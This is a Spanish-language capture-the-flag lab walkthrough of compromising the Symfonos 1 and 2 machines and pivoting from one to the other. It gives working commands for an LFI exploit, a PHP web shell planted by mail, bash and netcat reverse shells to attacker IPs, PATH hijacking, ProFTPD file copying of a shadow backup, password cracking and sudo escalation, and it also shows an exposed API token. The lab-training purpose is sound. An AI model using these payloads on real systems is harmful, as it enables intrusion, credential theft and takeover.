tags:
_____
### MAPA DE RED
___
![[Pasted image 20251118215454.png]]

Inicialmente he instalado las dos máquinas que me van a servir para hacer el pivoting. La intrusión la voy a realizar en la Symfonos 1 y posteriormente ralizar el pivoting para entrar en la Symfonos 2.
Al importar las dos máquinas y ejecutar un escaneo de la red, vemos lo siguiente:

```bash
sudo arp-scan -I eth0 --localnet
```

![[Pasted image 20251109092821.png]]

Ahora voy a configurar las máquinas de forma que solo tenga alcance a ver la Symfonos 1, cuya IP  es la 192.168.0.30, y que la Symfonos 2 solamente sea visible desde la Symfonos 1:

### 192.168.0.30 - SYMFONOS 1
____
Para empezar con el reconocimiento voy a comenzar lanzando un ping a la máquina para comprobar si tengo conectividad:

```bash
ping -c 1 192.168.0.30
```

![[Pasted image 20251109152005.png]]

Tengo conectividad, y además puedo saber que se trata de una máquina linux por el TTL. Ahora es turno de realizar un escaneo de puertos para comprobar cuales se encuentran abiertos para intentar buscar un punto de entrada. Para ello uso el siguiente comando de nmap:

```bash
nmap -sS -p- -n -Pn -vvv --open --min-rate 5000 -oN ports 192.168.0.30
```

![[Pasted image 20251109152533.png]]

```bash
nmap -sVC -n -Pn -p22,25,80,139,445 -vvv --min-rate 5000 -oN version 192.168.0.30
```

![[Pasted image 20251109152555.png]]
![[Pasted image 20251109152636.png]]
![[Anexos/Pasted image 20251109152701.png]]

Primero compruebo que en la web no hay nada visible de primeras, solo una foto:

![[Anexos/Pasted image 20251109153101.png]]

Un buen punto de partida es mirar con smbmap si podemos ver algún recurso compartido usando la herramienta smbmap con el siguiente comando:

```bash
smbmap -H 192.168.0.30
```

![[Pasted image 20251109153230.png]]

Aquí podemos ver tanto un usuario llamado helios como un recurso compartido sobre el que tenemos permiso de lectura, así que vamos a leerlo usando el siguiente comando:

```bash
smbmap -H 192.168.0.30 -r anonymous
```

![[Anexos/Pasted image 20251109153640.png]]

Ahora voy a descargarme el recurso attention.txt usando el siguiente comando:

```bash
smbmap -H 192.168.0.30 --download anonymous/attention.txt
```

![[Pasted image 20251109153735.png]]

Aquí vemos cosas importantes: Primero vemos un nombre de usuario llamado Zeus, y también vemos un mensaje en el que se solicita que se dejen de usar ciertas contraseñas, lo que no sugiere que al menos una de ellas pertenece a un usuario. Voy a copiarlas y añadirlas a un archivo llamado passwd.txt que nos servirá más adelante. También he creado un archivo llamado users.txt en el que he puesto los usuarios de zeus y helios.

En este punto he probado hacer fuerza bruta con hydra por el puerto ssh con ambos diccionarios, sin éxito, así que tras probar iniciar sesión por el servicio smb del puerto 445, obtengo acceso a la cuenta de helios:

```bash
smbmap -u 'helios' -p 'qwerty' -H 192.168.0.30 -r helios
```

![[Pasted image 20251109154808.png]]

Procedo a descargarlos con el siguiente comando:

```bash
smbmap -u 'helios' -p 'qwerty' -H 192.168.0.30 --download helios/todo.txt
smbmap -u 'helios' -p 'qwerty' -H 192.168.0.30 --download helios/research.txt
```

![[Pasted image 20251109155151.png]]

En el archivo research no vemos nada raro, pero en el archivo todo.txt vemos que nos dice "Work on /h3l105", así que vamos a echar un vistazo a este directorio:

![[Pasted image 20251109161448.png]]

Se trata de un wordpress, pero por la estética parece que se está aplicando virtual hosting y necesitamos añadir el dominio al archivo /etc/hosts. Para localizar ese dominio simplemente echo un vistazo al código fuente de la web y veo que es symfonos.local. Una vez añadido vemos lo siguiente:

![[Anexos/Pasted image 20251109161657.png]]

Tenemos al usuario admin del wordpress, pero antes voy a utilizar la herramienta wpscan para intentar listar usuarios y plugins, con el siguiente comando:

```bash
wpscan --url http://symfonos.local/h3l105/ --enumerate u,vp --api-token OWzGUYK83WWnTTXAiYGHSt7ko8w7tZ6uAU8ridGzIlw
```

![[Anexos/Pasted image 20251109162412.png]]

Hacemos una búsqueda en searchsploit con el siguiente comando para buscar y ver el exploit:

```bash
searchsploit mail masta
```

![[Anexos/Pasted image 20251109162829.png]]

```bash
searchsploit -x php/webapps/40290.txt
```

![[Anexos/Pasted image 20251109162736.png]]

```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
```

![[Anexos/Pasted image 20251110152028.png]]

Como tenemos el usuario helios descubierto, el puerto 25 abierto y capacidad de listar archivos, podemos intentar enviarle un mail al usuario helios utilizando telnet por el puerto 25 para enviarle una cadena de php maliciosa donde nos permita hacer una ejecución remota de comandos:

```bash
telnet 192.168.0.30
MAIL FROM: vic
RCPT TO: helios
DATA
<?php system($_GET['cmd']);?>
.
quit
```

![[Anexos/Pasted image 20251110165013.png]]

Ahora podemos intentar ejecutar un comando con el parámetro cmd leyendo el mail que le acabamos de enviar al usuario helios. Estos mails se encuentran en la siguiente ruta:

```text
/var/mail/helios
```

Con lo cual, usando la vulnerabilidad del local file inclusion podemos intentar ejecutar un comando haciendo uso del parámetro cmd, usando por consola el siguiente comando:

```bash
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/var/mail/helios&cmd=whoami"
```

![[Anexos/Pasted image 20251110165543.png]]

Ahora evidentemente voy a ejecutar una reverse shell con el siguiente comando después de ponerme en escucha con netcat por el puerto 443:

```bash
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/var/mail/helios&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.28/443%200%3E%261%22
```

![[Anexos/Pasted image 20251110185841.png]]

Después de hacer un tratamiento de la TTY, somos el usuario helios ejecuto el siguiente comando para buscar archivos en todo el sistema que tengan persmisos de SUID asignados:

```bash
find / -perm -4000 2>/dev/null
```

![[Anexos/Pasted image 20251111151357.png]]

Observo este binario, que tras ejecutarlo arroja lo siguiente:

![[Anexos/Pasted image 20251111151436.png]]

Ahora lo reviso con el comando strings:

```bash
strings statuscheck
```

Aquí veo que se está ejecutando el comando curl pero de forma relativa, con lo que es muy viable hacer un secuestro del path:

![[Anexos/Pasted image 20251111151924.png]]

Esto ahora canta a Path hijacking, así que el proceso a seguir es crear un archivo llamado **curl** en una ruta en la que tenga permisos de lectura y escritura, como /tmp, con la siguiente línea de código:

```bash
chmod u+s /bin/bash
```

Luego le doy permisos de ejecución:

```bash
chmod 777 curl
```

Ahora modifico el PATH para que tenga en cuenta la ruta /tmp como primer directorio para buscar comandos de forma relativa:

```bash
export PATH=/tmp:$PATH
```

Ahora ejecuto el binario /opt/statuscheck y comprobamos que haya funcionado ejecutando el siguiente comando:

```bash
ls -la /bin/bash
bash -p
```

![[Anexos/Pasted image 20251112104825.png]]
![[Anexos/Pasted image 20251112120007.png]]

Ahora la máquina ya está rooteada, aunque este paso no es estrictamente necesario para hacer el pivoting.

### 10.10.10.128 - SYMFONOS 2 - PIVOTING
___
Una vez gano acceso a la primera máquina, ejecuto el comando **ip a** y veo lo siguiente:

![[Anexos/Pasted image 20251112142434.png]]

La ip **192.168.0.30** es la ip que veía desde mi máquina atacante, y la que me interesa ahora es la ip **10.10.10.129** ya que es en ese segmento de red donde voy a tratar de vulnerar la máquina de la red interna.
Para el pivoting voy a utilizar chisel y socat.

Primero voy a hacer un reconocimiento de la interfaz de red **ens33**, pero como no tengo disponible el comando arp-scan, voy a utlizar un comando oneliner de bash para hacer el escaneo:

```bash
seq 1 254 | xargs -P 50 -I {} bash -c 'ping -c 1 -W 1 10.10.10.{} &> /dev/null && echo "[+] El host 10.10.10.{} - ACTIVO"'
```

![[Anexos/Pasted image 20251112212333.png]]

Ahora, sabiendo que la ip de la máquina víctima es la 10.10.10.128, voy a utilizar otro oneliner pero esta vez para hacer un descubrimiento de puertos abiertos:

```bash
seq 1 65535 | xargs -P 500 -I PORT bash -c 'timeout 1 bash -c "echo > /dev/tcp/10.10.10.128/PORT" 2>/dev/null && echo "[+] Puerto PORT - ABIERTO"'
```

![[Anexos/Pasted image 20251112212804.png]]

Ahora voy a comenzar con chisel y socat a hacer el port forwarding. Primero me pongo en escucha con chisel en mi máquina atacante usando el siguiente comando:

```bash
./chisel server --reverse -p 1234
```

Y ejecuto el siguiente comando en la máquina víctima usando el siguiente comando:

```bash
./chisel client 192.168.0.28:1234 R:80:10.10.10.128:80 
./chisel client 192.168.0.28:1234 R:socks
```

Ahora, después de haber añadido la línea **socks5 127.0.0.1** al archivo /etc/proxychains4.conf, ya puedo ejecutar cualquier comando poniendo siempre el prefijo **proxychains**
Voy a hacer un escaneo de nmap de los puertos de la máquina de la red interna con ip 10.10.10.128:

```bash
sudo proxychains4 nmap -sT -Pn -n 10.10.10.128 --top-ports 500 -oN ports_10.10.10.128
```

![[Anexos/Pasted image 20251115160733.png]]

```bash
 sudo proxychains4 nmap -sCV -n -v -Pn -p21,22,80,139,445 10.10.10.128 -oN version_10.10.10.128
```

![[Anexos/Pasted image 20251115160840.png]]

En este punto, viendo que el puerto 445 está abierto, voy a utilizar smbmap para listar archivos y recursos compartidos, usando el siguiente comando:

```bash
proxychains smbmap -H 10.10.10.128
```

![[Anexos/Pasted image 20251115162112.png]]

Ahora lo listamos:

```bash
smbmap -H 10.10.10.128 -r anonymous
```

![[Anexos/Pasted image 20251115162249.png]]

```bash
sudo proxychains4 smbmap -H 10.10.10.128 --download 'anonymous/backups/log.txt'
```

![[Anexos/Pasted image 20251118102214.png]]

Aquí ya vemos el primer dato interesante, que es una copia del archivo shadow en la ruta /var/backups/shadow.bak

![[Anexos/Pasted image 20251118102328.png]]

También vemos al usuario aeolus.

En este punto, ya me había fijado en otra cosa, y es que la versión del servicio PROFTPD es algo obsoleta, y haciendo una búsqueda en searchsploit veo lo siguiente:

![[Anexos/Pasted image 20251118102500.png]]

Tenemos una forma potencial de lectura de archivos sin necesidad de estar autenticados. Revisando el arvhivo .txt del exploit, veo que nos permite usar los comandos **ctfr** y **cpto** para copiar y mover un archivo de una ruta a otra, así que lo que haré es conectarme por ftp y tratar de copiar el archivo shadow.bak al directorio compartido de anonymous para posteriormente traerlo a mi máquina local.

Primero me conecto por ftp, luego copio el archivo y lo pego en la otra ruta:

```bash
sudo proxychains4 ftp 10.10.10.128
Name: anonymous
site cpfr /var/backups/shadow.bak
site cpto /home/aeolus/share/shadow.bak
quit
```

![[Anexos/Pasted image 20251118103206.png]]

Ahora lo revisamos con smbmap y nos traemos el archivo a la máquina local:

```bash
sudo proxychains4 smbmap -H 10.10.10.128 -r anonymous
```

![[Pasted image 20251118103636.png]]

Ahora me lo descargo:

```bash
sudo proxychains4 smbmap -H 10.10.10.128 --download 'anonymous/shadow.bak'
```

![[Pasted image 20251118103821.png]]

Ya que vemos la contraseña de dos usuarios sin privilegios y la del usuario root, vamos a intentar crackear las tres usando john the reaper a ver si podemos obtener alguna. Primero guardo las tres en un archivo llamado hashes:

![[Pasted image 20251118104403.png]]

Ahora usando el siguiente comando intento crackearlas:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=crypt
```

![[Pasted image 20251118104437.png]]

Obtenemos la primera contraseña, así que voy a almacenarla en un archivo llamado creds.txt para tenerlas a mano. Hecho esto me conecto por ssh:

```
sudo proxychains4 ssh aeolus@10.10.10.128
```

![[Pasted image 20251118104713.png]]

Ahora para escalar privilegios, debo usar el comando:

```bash
ss -nltp
```

![[Anexos/Pasted image 20251118210910.png]]

La máquina tiene un puerto interno abierto, el 8080, así que vamos a aplicar local port forwarding para ver este servicio desde mi localhost:

```bash
sudo proxychains4 ssh aeolus@10.10.10.128 -L 8080:127.0.0.1:8080
```

![[Anexos/Pasted image 20251118212309.png]]



![[Anexos/Pasted image 20251118212928.png]]

Este software tiene una forma de vulnerarse en la que ponemos en el campo de comunity un comando para que se produzca una RCE. El one liner viene especificado dentro del payload de searchsploit, y es el siguiente:

```bash
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.129 4646 >/tmp/f) #
```

![[Anexos/Pasted image 20251118214725.png]]

Antes de darle a añadir device para que se ejecute, debemos redireccionar el flujo de la ejecución para que la reverse shell llegue a nuestra máquina de atacante. Para esto, lo que voy a hacer es ejecutar el siguiente comando de socat en la máquina **SYMFONOS** **1**, con IP **10.10.10.129**, para que se redirija el flujo **desde la 10.10.10.129 hacia la 192.168.0.28** que es mi máquina de atacante. El comando de socat es el siguiente:

```bash
socat TCP-LISTEN:4646,fork TCP:10.10.10.129:4646
```

Ahora, si ejecuto la acción de añadir dispositivo en librenms, accedemos a la máquina SYMFONOS 2 desde mi máquina host como el usuario cronus:

![[Pasted image 20251118215122.png]]

Ahora ejecutando el comando sudo -l vemos lo siguiente:

```bash
sudo -l
```

![[Pasted image 20251118215200.png]]

Ahora, en GTFObins vemos lo siguiente:

![[Anexos/Pasted image 20251118215551.png]]

```bash
sudo -u root mysql -e '\! /bin/bash'
```

Ejecutamos el comando y....

![[Anexos/Pasted image 20251118215749.png]]

![[Anexos/Pasted image 20251118215858.png]]
